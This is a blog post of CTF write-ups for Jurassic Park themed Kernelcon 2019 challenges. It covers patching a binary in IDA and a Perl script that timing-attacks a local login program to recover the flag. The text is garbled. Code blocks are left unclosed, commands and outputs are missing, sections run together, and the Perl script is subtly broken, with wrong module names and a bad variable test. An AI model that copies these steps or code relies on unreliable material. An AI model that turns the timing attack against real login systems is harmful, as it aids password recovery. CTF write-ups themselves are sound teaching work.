Kernelcon 2020 is a litle less then 5 months away and my newest challenges are well into their development life cycle. However this post is not about 2020; Instead I will be taking you, the reader, through the CTF writeups for the ctf's I developed for 2019! 

# Setting Up for the CTF's
## Getting the Challenges
All of these challenges were built to run on a Debian build Linux distro!. From a Linux terminal, run the following commands to pull down the repository!

```Console
Qu3b411@host:~/$ mkdir kernelcon-2019-ctf-qu3b411
Qu3b411@host:~/$ cd kernelcon-2019-ctf-qu3b411

# The Challenges
These challenges were themed after Jurassic Park and some of these challenges cannot be solved without understanding the refrences so keep that in mind! Now that you have the tools set up I would encourage you to actually attempt to solve the challenges yourself!,

## Ah Ah Ah, You Didn't Say the magic Word!

For this challenge you must watch the [video](https://www.youtube.com/watch?v=RfiQYRn7fBg) that was provided during the CTF, without it there is no way to solve the challenge!

In your Console do the following:

```Console


Qu3b411@host:~/Downloads$ pdpd; cd ./ah-ah-ah,-You-didnt-say-the-magic-word/challenge/
Qu3b411@host:~/kernelcon-2019-ctf-qu3b411/kernelcon-CTF-2019-solutions/ah-ah-ah,-You-didnt-say-the-magic-word/challenge$ls -l

## We used the complete DNA of a frog to fill in the holes and complete the code.

Issue the following command in your console window to navigate to this challenge directory.

```Console

You did not correct the dna strand, your baby dino is a mutated freek of nature.
```
Their is no input, so lets start disassembling the code and see whats happening, 
```Console
Qu3b411@host:~/kernelcon-2019-ctf-qu3b411/kernelcon-CTF-2019-solutions/we-used-the-complete-DNA-of-a-frog-to-fill-in-the-holes-and-complete-the-code/challenge$  ~/idafree-7.0/ida64 ./DNASequence 
```
When presented with the following screen you dont have to change any settings, just click ok to continue loading the file.

![](https://raw.githubusercontent.com/Qu3b411/qu3b411.github.io/master/assets/DNA1.png)

in the function list you will notice several 3 letter combinations. these functions return a numerical representation of that string! you will also notice ``` HoleInDNA```,```DinoDnaSeq```,andFrogD```naSeq```. 

![](https://raw.githubusercontent.com/Qu3b411/qu3b411.github.io/master/assets/DNA2.png)

By this point the problem should be clear to you based on the name of this Challenge "We used the complete DNA of a frog to fill in the holes and complete the code"! Its not my style to give red herrings and bad clues... I like a challenge that forces one to tackle the problem in a straight out technical manner. Lets take a look inside of the DinoDnaSeq and the FrogDnaSeq and see what's going on!

![](https://raw.githubusercontent.com/Qu3b411/qu3b411.github.io/master/assets/DNA3.png)

all throughout the ```DinoDnaSeq``` we see calls to ```HoleInDNA```; these calls, as you may have noticed, adversly effect the control flow of the Assembly. You can't just change the function call. It just wont work the way you want it to. 

![](https://raw.githubusercontent.com/Qu3b411/qu3b411.github.io/master/assets/DNA4.png)

However if you look at the ```FrogDnaSeq``` you may notice a nice clean control flow that would be a lot easier to manipulate, for this solution that's exactly what I'm going to do, but first we have to construct a table to track the function calls. That table might look something like this!

Which means it's time to start patching the program up; First let's patch up the main program to call the correct function. For this solution we will actually be calling ```FrogDnaSeq```. You must find the call to DinoDnaSeq, once located,highlight it and select ```Edit>Patch program>Assemble...```.


![](https://raw.githubusercontent.com/Qu3b411/qu3b411.github.io/master/assets/DNA5.png)

The following window appears, you can then edit the function call, ```call DinoDnaSeq``` should be changed to ```call FrogDnaSeq```

![](https://raw.githubusercontent.com/Qu3b411/qu3b411.github.io/master/assets/DNA_6.png)

It's now time to start editing the FrogDnaSeq function. To do this traverse the table and edit the function calls in ```FrogDnaSeq``` to their respective values, as dictated by the table we constructed previously. Keep in mind it is important to change the function paramaters to correspond to where the DNA was inherited from!

The register used to pass the paramater to the function call is ```edi``` ,the value being passed to the function will always occur immediatly before the call itself!

Let's walk through the first function call together. Start by highlighting ```mov edi, 0``` and selecting ```Edit>Patch program> Assemble```

![](https://raw.githubusercontent.com/Qu3b411/qu3b411.github.io/master/assets/DNA7.png)

Modify the instruction from ```mov edi,1``` to ```mov edi,0``` and select **ok**

![](https://raw.githubusercontent.com/Qu3b411/qu3b411.github.io/master/assets/DNA8.png)

Next modify the function call itself, Start by highlighting ```call UAC``` and then select ```Edit>Patch program>Assemble...``` 
![](https://raw.githubusercontent.com/Qu3b411/qu3b411.github.io/master/assets/DNA9.png)

In the Instructions Field modify ```call UAC ``` to ```call GUC``` and press **OK**


![](https://raw.githubusercontent.com/Qu3b411/qu3b411.github.io/master/assets/DNA10.png)

Hit **Cancel** on the proceeding screen, then repeat these steps modifying each function call to the corresponding value on the provided table. Remember that calls to HoleInDNA are voids that can be ignored, skip over that function call and move to the next... **Do not modify** the paramater being passed to HoleInDna.

Once you have applied the patches to the binary go to ```Edit>Patch program>Apply patches to input``` 

![](https://raw.githubusercontent.com/Qu3b411/qu3b411.github.io/master/assets/DNA11.png)

the following window will appear, click **ok**.


![](https://raw.githubusercontent.com/Qu3b411/qu3b411.github.io/master/assets/DNA12.png)

Navigate back to your console and hit CTRL+c to terminate ida, then run the modified binary

````Console

Congratulations, You now have the Second ctf flag!

## I did a test run on this thing it took me twenty minutes

This is the last one to be solved during KernelCon, This is a Misc challenge that does not require any reverse engineering. instead one must execute a timing attack against the password input, so lets get started!
in your console window execute the following commands

````Console
Qu3b411@host:~/kernelcon-2019-ctf-qu3b411/kernelcon-CTF-2019-solutions/we-used-the-complete-DNA-of-a-frog-to-fill-in-the-holes-and-complete-the-code/challenge$ cd ../../I-did-a-test-run-on-this-thing-it-took-me-twenty-minutes/challange

Login: 
````
The hint given during this challenge was ```{0-9},{a-f},k,r,n,l,'}','{'```. This should have tipped off those whom were observent that the input to the login was the kernel flag! 

In the Console do the following.

```Console
Qu3b411@host:~/kernelcon-2019-ctf-qu3b411/kernelcon-CTF-2019-solutions//I-did-a-test-run-on-this-thing-it-took-me-twenty-minutes/challange$ vim TimingAttack.pl
```
You will then create a perl script, hit ```i``` to enter insertion mode in the vim console, write the following script

```perl
#!/usr/bin/env perl

use Time::HiRes;

my $str = 'kernel{'; #Populate the base string with 'Kernel{' to reduce characters in the attack space!

# the hash value occupies 32 bytes in the flag!
for(my $x=0; $x<32; $x++)
{
  my @char; # an array to store the character that has the longest time return, this array also stores the time return
  for my $n (('a'..'f'),(0..9)) #iterate over the characters a-f0-9
  {
    my $t = [Timer::HiRes::gettimeofday()]; #get the current system time
    system("echo $str$n |./VulnerableLogin >> /dev/null"); # run the program with the password being built through the timing attack, redirect all output to /dev/null!
    $t = Timer::HiRes::tv_interval($t); # record the execution time back into t.
    if (!char) #if char is not defined, define it
    {
      @char = ($n,$t); #save character, return time in that order
    }
    elsif ($t > $char[1]) # if the execution time is greater then the prior time then retest the character
    {
       my $t = [Timer::HiRes::gettimeofday()]; #get the current system time
       system("echo $str$n |./VulnerableLogin >> /dev/null"); # run the program with the password being built through the timing attack, redirect all output to /dev/null!
       $t = Timer::HiRes::tv_interval($t); # record the execution time back into t.
       if ($t > $char[1]) # if it is not a false positive
       {
         @char = ($n,$t); #save character, return time in that order
       }
    }
  }
  $str.="$char[0]"; #append the character to the login string
  print "$str\n"; # print the character to view the progress  of your attack!
}
print $str."}\n"; #print the flag with closing bracket
```
Hit the ```esc``` button then type ```:wq!``` into your console followed by hitting enter, you will return back to the console screen. In your you can run the script, let it run, it will take some time to get the flag!
